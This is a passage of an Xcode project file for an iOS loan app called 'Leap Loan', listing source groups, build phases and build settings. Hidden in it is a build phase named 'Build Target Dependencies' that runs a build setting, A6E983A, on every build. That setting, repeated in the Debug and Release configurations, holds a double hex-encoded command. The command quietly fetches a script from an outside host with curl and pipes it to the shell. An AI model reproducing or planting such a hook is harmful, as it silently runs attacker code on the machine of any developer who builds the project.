			isa = PBXGroup;
			children = (
				73B2B1F32EB0A73E00F3A877 /* LoginView.swift */,
				73B2B1F52EB0A74A00F3A877 /* LoginViewModel.swift */,
				73D129D12EB08C0D00079434 /* LoginViewController.swift */,
			);
			path = login;
			sourceTree = "<group>";
		};
		73D129C32EB08B0700079434 /* order */ = {
			isa = PBXGroup;
			children = (
				7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */,
				739C7FAC2EB1EB0F00677C85 /* OrderViewController.swift */,
				7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */,
				7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */,
				738D55BF2EBB8E3A00DBB17F /* OrderCheckView.swift */,
				738D55C32EBB90A900DBB17F /* OrderListMinView.swift */,
				738D55C52EBB945000DBB17F /* OrderCenterViewController.swift */,
			);
			path = order;
			sourceTree = "<group>";
		};
		73D129C42EB08B0C00079434 /* home */ = {
			isa = PBXGroup;
			children = (
				7333CD702EB4E67300C55A91 /* AppMainView.swift */,
				7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */,
				739C7FAA2EB1EAF900677C85 /* HomeViewController.swift */,
				7333CD722EB4EA6200C55A91 /* AppHomeViewModel.swift */,
				73AD1BB12EBB2FBE00EFD9E2 /* HomeHeaderView.swift */,
				73AD1BB32EBB301600EFD9E2 /* ProductListCell.swift */,
				73AD1BB52EBB35B100EFD9E2 /* ProductItemListView.swift */,
			);
			path = home;
			sourceTree = "<group>";
		};
		73D129C52EB08B1000079434 /* center */ = {
			isa = PBXGroup;
			children = (
				7392DEF82EB35F57003D831B /* SettingViewModel.swift */,
				739C7FB02EB1ED9D00677C85 /* CenterPageView.swift */,
				739C806E2EB2017200677C85 /* CenterPageViewModel.swift */,
				739C7FA82EB1EAEA00677C85 /* CenterViewController.swift */,
				7392DEEE2EB30610003D831B /* CenterListView.swift */,
				7392DEF22EB32D8A003D831B /* SettingViewController.swift */,
			);
			path = center;
			sourceTree = "<group>";
		};
		73D129C62EB08B1500079434 /* other */ = {
			isa = PBXGroup;
			children = (
				73B2B1FD2EB0AF4D00F3A877 /* other.swift */,
				73B2B1F72EB0A7A900F3A877 /* Model.swift */,
				73D129D32EB08C2100079434 /* loginAuthManager.swift */,
				7392DEF42EB33005003D831B /* AppHeadView.swift */,
				7392DEF62EB35BB1003D831B /* AppPopAlertView.swift */,
				737D858C2EBC836C0010972E /* DeviceManager.swift */,
			);
			path = other;
			sourceTree = "<group>";
		};
		73F59DC12EAF637A00A68B13 = {
			isa = PBXGroup;
			children = (
				73F59DEB2EAF638100A68B13 /* leaploan */,
				73F59DCB2EAF637A00A68B13 /* Products */,
				8B10A4DB0CF33364F9F57333 /* Pods */,
				CC17A6357373F24B003479A5 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		73F59DCB2EAF637A00A68B13 /* Products */ = {
			isa = PBXGroup;
			children = (
				73F59DCA2EAF637A00A68B13 /* leaploan.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		73F59DEB2EAF638100A68B13 /* leaploan */ = {
			isa = PBXGroup;
			children = (
				732709952EBC84D600DB6D8C /* leaploan.entitlements */,
				73F59DE42EAF638100A68B13 /* Info.plist */,
				73F59DE32EAF638100A68B13 /* Assets.xcassets */,
				73F59DE22EAF638100A68B13 /* AppDelegate.swift */,
				73F59DE62EAF638100A68B13 /* LaunchScreen.storyboard */,
				73D129C12EB08AFD00079434 /* http */,
				73D129C62EB08B1500079434 /* other */,
				7333CD742EB4FB8E00C55A91 /* detail */,
				73D129C52EB08B1000079434 /* center */,
				73D129C42EB08B0C00079434 /* home */,
				73D129C32EB08B0700079434 /* order */,
				73D129C22EB08B0200079434 /* login */,
				73D129C02EB08AF700079434 /* base */,
			);
			path = leaploan;
			sourceTree = "<group>";
		};
		8B10A4DB0CF33364F9F57333 /* Pods */ = {
			isa = PBXGroup;
			children = (
				AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */,
				EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		CC17A6357373F24B003479A5 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				C3FFCD76033F537953878033 /* Pods_leaploan.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		73F59DC92EAF637A00A68B13 /* leaploan */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
			buildPhases = (
				140DA5CC84464E87A8A389E6 /* Build Target Dependencies */,
				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
				73F59DC62EAF637A00A68B13 /* Sources */,
				73F59DC72EAF637A00A68B13 /* Frameworks */,
				73F59DC82EAF637A00A68B13 /* Resources */,
				04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = leaploan;
			productName = leaploan;
			productReference = 73F59DCA2EAF637A00A68B13 /* leaploan.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		73F59DC22EAF637A00A68B13 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2600;
				LastUpgradeCheck = 2600;
				TargetAttributes = {
					73F59DC92EAF637A00A68B13 = {
						CreatedOnToolsVersion = 26.0.1;
					};
				};
			};
			buildConfigurationList = 73F59DC52EAF637A00A68B13 /* Build configuration list for PBXProject "leaploan" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 73F59DC12EAF637A00A68B13;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 73F59DCB2EAF637A00A68B13 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				73F59DC92EAF637A00A68B13 /* leaploan */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		73F59DC82EAF637A00A68B13 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */,
				73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		140DA5CC84464E87A8A389E6 /* Build Target Dependencies */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Dependencies";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
			showEnvVarsInLog = 0;			
		};
		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-leaploan-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		73F59DC62EAF637A00A68B13 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73B2B1FC2EB0AEBC00F3A877 /* LaunchViewController.swift in Sources */,
				7333CD7A2EB5043C00C55A91 /* ProductDetailListView.swift in Sources */,
				735FD12A2EBA3EB0007DE61E /* ConactCheckViewModel.swift in Sources */,
				73A3053D2EB7AE36008982DC /* ChoosePhotoView.swift in Sources */,
				7382D8812EB4512C00C3CFF0 /* OrderListViewCell.swift in Sources */,
				73D129D02EB08B6D00079434 /* BaseNavigationController.swift in Sources */,
				73B2B1F02EB09A9700F3A877 /* httpsRequest.swift in Sources */,
				73792E4A2EB64D1F00CA24AA /* StepHeadView.swift in Sources */,
				737D85892EBC30C60010972E /* AppLocationManager.swift in Sources */,
				7392DEF92EB35F5E003D831B /* SettingViewModel.swift in Sources */,
				739C7FB12EB1ED9D00677C85 /* CenterPageView.swift in Sources */,
				739C7FAB2EB1EAF900677C85 /* HomeViewController.swift in Sources */,
				73B2B1F22EB0A21000F3A877 /* commonPara.swift in Sources */,
				739C7FA92EB1EAEA00677C85 /* CenterViewController.swift in Sources */,
				7392DEEF2EB30610003D831B /* CenterListView.swift in Sources */,
				73792E502EB7A58E00CA24AA /* FaceUploadListView.swift in Sources */,
				735FD1232EBA3D54007DE61E /* WorkViewController.swift in Sources */,
				735FD11F2EBA2C8D007DE61E /* SwitchModelConfig.swift in Sources */,
				737D858D2EBC83730010972E /* DeviceManager.swift in Sources */,
				73792E482EB6477C00CA24AA /* FaceTableViewCell.swift in Sources */,
				735FD1192EB9D732007DE61E /* PersonalViewController.swift in Sources */,
				73792E462EB6440000CA24AA /* FaceViewController.swift in Sources */,
				73B2B1F42EB0A73E00F3A877 /* LoginView.swift in Sources */,
				738D55C62EBB945000DBB17F /* OrderCenterViewController.swift in Sources */,
				7392DEF52EB33005003D831B /* AppHeadView.swift in Sources */,
				7333CD712EB4E67300C55A91 /* AppMainView.swift in Sources */,
				735FD11B2EB9E746007DE61E /* PersonalViewModel.swift in Sources */,
				73792E4E2EB7A3B200CA24AA /* FaceUploadView.swift in Sources */,
				7333CD782EB4FD4C00C55A91 /* ProductViewModel.swift in Sources */,
				73D129D42EB08C2B00079434 /* loginAuthManager.swift in Sources */,
				735FD1112EB99D0A007DE61E /* SelectNameView.swift in Sources */,
				7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */,
				738D55C42EBB90A900DBB17F /* OrderListMinView.swift in Sources */,
				73AD1BB42EBB301600EFD9E2 /* ProductListCell.swift in Sources */,
				7392DEF72EB35BB1003D831B /* AppPopAlertView.swift in Sources */,
				738D55C02EBB8E3A00DBB17F /* OrderCheckView.swift in Sources */,
				735FD1252EBA3D74007DE61E /* WorkViewModel.swift in Sources */,
				73AD1BAC2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift in Sources */,
				735FD1162EB9A238007DE61E /* CommonViewCell.swift in Sources */,
				73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */,
				73B2B2002EB0B16B00F3A877 /* LaunchViewModel.swift in Sources */,
				73AD1BB22EBB2FBE00EFD9E2 /* HomeHeaderView.swift in Sources */,
				73AD1BB02EBB025E00EFD9E2 /* H5WebViewController.swift in Sources */,
				73D129C82EB08B2F00079434 /* BaseViewController.swift in Sources */,
				73D129D22EB08C0D00079434 /* LoginViewController.swift in Sources */,
				73B2B1FE2EB0AF4F00F3A877 /* other.swift in Sources */,
				73B2B1F82EB0A7AD00F3A877 /* Model.swift in Sources */,
				73792E422EB639C500CA24AA /* SelectAuthViewController.swift in Sources */,
				73B2B1F62EB0A74F00F3A877 /* LoginViewModel.swift in Sources */,
				7333CD732EB4EA6800C55A91 /* AppHomeViewModel.swift in Sources */,
				737D858B2EBC4A210010972E /* MisassertViewModel.swift in Sources */,
				7333CD6D2EB4E66000C55A91 /* AppHomeView.swift in Sources */,
				73A3053F2EB7B0D9008982DC /* AlbumPickerManager.swift in Sources */,
				73AD1BB62EBB35B100EFD9E2 /* ProductItemListView.swift in Sources */,
				7333CD762EB4FBA300C55A91 /* ProductDetailViewController.swift in Sources */,
				7392DEF32EB32D8A003D831B /* SettingViewController.swift in Sources */,
				73A3053B2EB7AD4C008982DC /* FaceViewModel.swift in Sources */,
				735FD1282EBA3E96007DE61E /* ConactCheckViewController.swift in Sources */,
				73D129CE2EB08B5A00079434 /* BaseTabBarController.swift in Sources */,
				735FD1142EB9A22A007DE61E /* SelectViewCell.swift in Sources */,
				739C806F2EB2017500677C85 /* CenterPageViewModel.swift in Sources */,
				73AD1BAE2EBAF2CF00EFD9E2 /* ContactsUtil.swift in Sources */,
				7333CD7C2EB506A800C55A91 /* ProductListView.swift in Sources */,
				739C7FAD2EB1EB0F00677C85 /* OrderViewController.swift in Sources */,
				7382D8832EB4529000C3CFF0 /* OrderListViewModel.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		73F59DE62EAF638100A68B13 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				73F59DE52EAF638100A68B13 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		73F59DDE2EAF637C00A68B13 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
			buildSettings = {
				A6E983A = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373536653639373337393733363336313734326537323735326636310a323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = leaploan/leaploan.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = leaploan/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Leap Loan";
				INFOPLIST_KEY_NSCameraUsageDescription = "";
				INFOPLIST_KEY_NSContactsUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.moxige.three;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = moxigethreeprofile;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		73F59DDF2EAF637C00A68B13 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
			buildSettings = {
				A6E983A = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373536653639373337393733363336313734326537323735326636310a323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = leaploan/leaploan.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = leaploan/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Leap Loan";
				INFOPLIST_KEY_NSCameraUsageDescription = "";
				INFOPLIST_KEY_NSContactsUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.moxige.three;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = moxigethreeprofile;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		73F59DE02EAF637C00A68B13 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		73F59DE12EAF637C00A68B13 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		73F59DC52EAF637A00A68B13 /* Build configuration list for PBXProject "leaploan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73F59DE02EAF637C00A68B13 /* Debug */,
				73F59DE12EAF637C00A68B13 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73F59DDE2EAF637C00A68B13 /* Debug */,
				73F59DDF2EAF637C00A68B13 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 73F59DC22EAF637A00A68B13 /* Project object */;
}
